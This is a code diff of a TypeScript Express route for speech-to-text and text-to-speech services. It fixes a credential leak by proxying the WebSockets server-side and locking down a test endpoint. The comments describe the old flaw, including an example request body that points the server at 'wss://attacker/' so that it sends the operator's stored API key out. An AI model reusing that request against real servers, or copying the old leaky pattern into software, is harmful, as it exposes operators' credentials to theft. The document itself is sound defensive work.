@@ -2,54 +2,55 @@
 //
 // A different model from /api/realtime (OpenAI Realtime, speech-to-speech):
 // this one wires three independent services together
-//   1. STT (browser audio → text) — WebSocket URL exposed to the browser
+//   1. STT (browser audio → text) — WebSocket PROXIED by this backend
 //   2. LLM (text → text)         — call routed through the regular /api/agents/:id/chat
-//   3. TTS (text → audio)        — WebSocket URL exposed to the browser
+//   3. TTS (text → audio)        — WebSocket PROXIED by this backend
 //
 // Both URLs and API keys live in admin settings (sttServiceUrl, sttApiKey,
-// ttsServiceUrl, ttsApiKey). We hand them to the browser as fully-formed
-// WSS URLs with the api_key query param already injected — the same shape
-// HighSpeedToText (https://speech-ui.methodinfo.fr/) documents.
+// ttsServiceUrl, ttsApiKey) and they STAY ON THIS SIDE. Audio DOES pass through
+// this backend now: /config/:agentId hands the browser same-origin paths
+// (/ws/voice/stt/:agentId, /ws/voice/tts/:agentId) and routes/voiceProxy.ts
+// bridges each one to the provider, injecting the api_key server-side.
+//
+// This is the deliberate reversal of what this file used to say — "no audio
+// passes through this backend, only credentials". That design shipped the
+// operator's speech key, in clear, to every browser allowed to open a voice
+// agent; on a multi-tenant instance it is a single provider credential handed
+// to every tenant, replayable for as long as it lives. Relaying the PCM costs
+// bandwidth, which is the cheaper half of the trade.
 import express from 'express';
 import { getSettings } from '../services/configManager.js';
-import { sessionUser } from '../middleware/auth.js';
+import { requireRole, sessionUser } from '../middleware/auth.js';
 import { checkAgentAccess } from '../lib/agentAccess.js';
 import type { AgentManager } from '../services/agentManager/index.js';
 import { asyncHandler } from '../lib/asyncHandler.js';
-
-function buildWsUrl(rawUrl: string, apiKey: string): string | null {
-  if (!rawUrl) return null;
-  try {
-    const u = new URL(rawUrl);
-    if (apiKey) u.searchParams.set('api_key', apiKey);
-    return u.toString();
-  } catch {
-    // Allow operators to paste a URL with query already present
-    if (apiKey && !rawUrl.includes('api_key=')) {
-      const sep = rawUrl.includes('?') ? '&' : '?';
-      return `${rawUrl}${sep}api_key=${encodeURIComponent(apiKey)}`;
-    }
-    return rawUrl;
-  }
-}
+// buildWsUrl composes the key-bearing UPSTREAM url and now lives beside the only
+// code that dials it; voiceProxyPath builds the same-origin path handed out
+// instead. The dependency runs one way — this file imports the proxy, never the
+// reverse — so the upgrade route and the config route cannot drift apart.
+import { buildWsUrl, voiceProxyPath } from './voiceProxy.js';
 
 export function externalVoiceRoutes(agentManager: AgentManager) {
   const router = express.Router();
 
-  // Returns connection info for a given external-voice agent so the browser
-  // can open STT + TTS WebSockets directly. No audio passes through this
-  // backend — only credentials and per-agent voice config.
+  // Returns connection info for a given external-voice agent. `wsUrl` is a
+  // SAME-ORIGIN PATH, not a provider URL: the browser turns it into
+  // `${proto}//${location.host}${wsUrl}` and routes/voiceProxy.ts relays the
+  // audio with the operator's key attached on this side. Nothing in this
+  // response is a credential.
   router.get(
     '/config/:agentId',
     asyncHandler(async (req, res) => {
-      const agent = agentManager.agents.get(req.params.agentId);
+      const agentId = req.params.agentId;
+      const agent = agentManager.agents.get(agentId);
       if (!agent) {
         res.status(404).json({ error: 'Agent not found' });
         return;
       }
-      // :agentId is caller-supplied. This route hands back the STT/TTS service
-      // URLs with the operator's API keys already injected plus the agent's voice
-      // config, so it is gated on the same rule as every other agent surface.
+      // :agentId is caller-supplied, and the paths below open a socket that
+      // spends the operator's speech credential, so this is gated on the same
+      // rule as every other agent surface. voiceProxy.ts re-runs this exact
+      // check on the upgrade: the path is an address, never a capability.
       const user = sessionUser(req, res);
       if (!user) return;
       const access = await checkAgentAccess(agent, user, 'read');
@@ -63,10 +64,13 @@ export function externalVoiceRoutes(agentManager: AgentManager) {
       }
 
       const settings = await getSettings();
-      const sttUrl = buildWsUrl(settings.sttServiceUrl, settings.sttApiKey);
-      const ttsUrl = buildWsUrl(settings.ttsServiceUrl, settings.ttsApiKey);
+      // Availability, read off the URLs alone. This handler never composes the
+      // key-bearing upstream URL at all — voiceProxy.ts rebuilds it when a
+      // socket is actually opened, which is the only place it is needed.
+      const sttConfigured = Boolean(settings.sttServiceUrl);
+      const ttsConfigured = Boolean(settings.ttsServiceUrl);
 
-      if (!sttUrl || !ttsUrl) {
+      if (!sttConfigured || !ttsConfigured) {
         res.status(503).json({
           error:
             'STT/TTS services are not configured. Set sttServiceUrl and ttsServiceUrl in Admin Settings.',
@@ -75,9 +79,16 @@ export function externalVoiceRoutes(agentManager: AgentManager) {
       }
 
       res.json({
-        stt: { wsUrl: sttUrl, sampleRate: 16000, encoding: 'pcm16', channels: 1 },
+        stt: {
+          available: true,
+          wsUrl: voiceProxyPath('stt', agentId),
+          sampleRate: 16000,
+          encoding: 'pcm16',
+          channels: 1,
+        },
         tts: {
-          wsUrl: ttsUrl,
+          available: true,
+          wsUrl: voiceProxyPath('tts', agentId),
           sampleRate: 22050,
           encoding: 'pcm16',
           channels: 1,
@@ -93,12 +104,27 @@ export function externalVoiceRoutes(agentManager: AgentManager) {
   // (TTS). Unlike /config/:agentId, this route does not require the agent to
   // be a voice agent — it just exposes whatever the operator configured.
   // The per-agent ttsVoiceId is used when an agentId is provided.
+  //
+  // This route used to hand the browser provider URLs with `api_key=<operator
+  // key>` in the query — the same leak /config/:agentId had, and on the hotter
+  // path: ChatTab and agentDetail/SettingsTab both call it on mount, so every
+  // authenticated user read the instance's STT/TTS credential. It now returns
+  // the proxy path like /config does.
+  //
+  // The leg it points at is session-scoped rather than agent-scoped, because
+  // this route answers with no agent in hand (agentId is optional and is only
+  // a voice personalisation). That is not a weakening: the gate is exactly what
+  // this route already enforced — a valid session, nothing more.
   router.get(
     '/services',
     asyncHandler(async (req, res) => {
       const settings = await getSettings();
-      const sttUrl = buildWsUrl(settings.sttServiceUrl, settings.sttApiKey);
-      const ttsUrl = buildWsUrl(settings.ttsServiceUrl, settings.ttsApiKey);
+      // Same reversal as /config: the browser is handed OUR path, never the
+      // provider URL with the operator's key in it. This flow names no agent,
+      // so it uses the session-scoped leg — which is the authorization this
+      // route already had (`authenticateToken`, mounted in index.ts).
+      const sttUrl = settings.sttServiceUrl ? voiceProxyPath('stt') : null;
+      const ttsUrl = settings.ttsServiceUrl ? voiceProxyPath('tts') : null;
 
       let voiceId = settings.ttsVoiceId || '';
       const agentId = typeof req.query.agentId === 'string' ? req.query.agentId : null;
@@ -200,8 +226,22 @@ export function externalVoiceRoutes(agentManager: AgentManager) {
     });
   }
 
+  // Admin-only, and the stored key is NEVER paired with a caller-supplied URL.
+  //
+  // Both halves matter. Without the role guard any authenticated user reached
+  // this. Without the pairing rule, a body of `{ "url": "wss://attacker/" }`
+  // with no apiKey made the server build `wss://attacker/?api_key=<stored key>`
+  // and CONNECT to it — a complete exfiltration primitive for the operator's
+  // speech credentials, needing nothing but a session.
+  //
+  // The rule below keeps every real use working, because the Admin Settings
+  // form always posts both fields (admin/SettingsTab.tsx): saved settings are
+  // probed by omitting the body, and a not-yet-saved URL is probed with the key
+  // typed beside it. Only the combination nobody legitimately needs — someone
+  // else's URL plus our key — is refused.
   router.post(
     '/test/:service',
+    requireRole('admin'),
     asyncHandler(async (req, res) => {
       const service = String(req.params.service || '').toLowerCase();
       if (service !== 'stt' && service !== 'tts') {
@@ -209,18 +249,17 @@ export function externalVoiceRoutes(agentManager: AgentManager) {
         return;
       }
       const settings = await getSettings();
-      const url =
-        typeof req.body?.url === 'string' && req.body.url.trim()
-          ? req.body.url.trim()
-          : service === 'stt'
-            ? settings.sttServiceUrl
-            : settings.ttsServiceUrl;
-      const apiKey =
-        typeof req.body?.apiKey === 'string'
-          ? req.body.apiKey
-          : service === 'stt'
-            ? settings.sttApiKey
-            : settings.ttsApiKey;
+      const callerUrl =
+        typeof req.body?.url === 'string' && req.body.url.trim() ? req.body.url.trim() : null;
+      const callerKey = typeof req.body?.apiKey === 'string' ? req.body.apiKey : null;
+      const storedUrl = service === 'stt' ? settings.sttServiceUrl : settings.ttsServiceUrl;
+      const storedKey = service === 'stt' ? settings.sttApiKey : settings.ttsApiKey;
+
+      const url = callerUrl ?? storedUrl;
+      // The stored credential follows the stored URL and nothing else. A caller
+      // who names the destination must also name the key, or the probe goes out
+      // unauthenticated — which fails honestly rather than leaking.
+      const apiKey = callerKey ?? (callerUrl ? '' : storedKey);
 
       if (!url) {
         res.status(400).json({ ok: false, error: `${service.toUpperCase()} URL is not set` });
